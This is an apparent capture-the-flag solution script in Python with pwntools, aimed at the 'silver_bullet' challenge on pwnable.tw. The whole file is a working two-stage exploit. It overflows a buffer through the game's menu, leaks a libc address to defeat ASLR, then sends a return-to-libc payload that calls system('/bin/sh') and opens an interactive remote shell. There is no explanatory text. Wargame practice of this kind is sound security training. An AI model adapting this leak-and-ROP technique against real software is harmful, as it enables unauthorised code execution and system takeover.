from pwn import *

system_off = 0x0003a940
binsh_off = 0x158e8b
libc_s_m_off = 0x00018540
put = 0x80484a8
main = 0x8048954
libc_got = 0x0804afec


payload1 = "a"*40
payload2 = "b"*8
payload31 = "\xff\xff\x7f" + "c"*4 + p32(put) + p32(main) + p32(libc_got) + "xyz"

s = remote("chall.pwnable.tw", 10103)
#s = process("./silver_bullet")
#gdb.attach(s)
s.recv()
s.sendline("1")
s.recv()
s.sendline(payload1)
s.recv()
s.sendline("2")
s.recv()
s.sendline(payload2)
s.recv()
s.sendline("2")
s.recv()
s.sendline(payload31)
s.recv()
s.sendline("3")
s.recv()
s.sendline("3")
s.recvuntil("win !!\n")
libc_s_m_addr = u32(s.recv()[:4])
hex(libc_s_m_addr)
libc_base = libc_s_m_addr - libc_s_m_off
system_addr = libc_base + system_off
binsh_addr = libc_base + binsh_off
payload32 = "\xff\xff\x7f" + "c"*4 + p32(system_addr) + "a"*4 + p32(binsh_addr) + "xyz"

s.sendline("1")
s.recv()
s.sendline(payload1)
s.recv()
s.sendline("2")
s.recv()
s.sendline(payload2)
s.recv()
s.sendline("2")
s.recv()
s.sendline(payload32)
s.recv()
s.sendline("3")
s.recv()
s.sendline("3")
s.recvuntil("You win !!")
s.interactive()

s.close()
